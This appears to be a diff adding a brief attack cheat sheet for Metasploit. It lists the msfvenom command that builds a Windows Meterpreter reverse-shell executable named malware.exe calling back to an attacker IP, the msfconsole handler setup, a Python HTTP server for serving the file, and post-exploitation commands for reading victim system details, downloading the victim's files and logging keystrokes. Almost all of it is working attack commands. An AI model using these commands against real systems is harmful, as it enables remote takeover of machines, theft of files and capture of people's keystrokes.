@@ -1,0 +1,19 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f exe 
+> malware.exe 
+
+#attaker ip and port kali ip and desired port
+
+Start Metasploit: msfconsole
+
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST <Attacker_IP> 
+set LPORT <Port> 
+exploit
+
+python3 -m http.server 9090
+
+sysinfo – Get victim system details. 
+o download <file_path> – Download a file from the victim. 
+o keyscan_start – Start a keylogger. 
+o keyscan_dump – Retrieve logged keystrokes. 
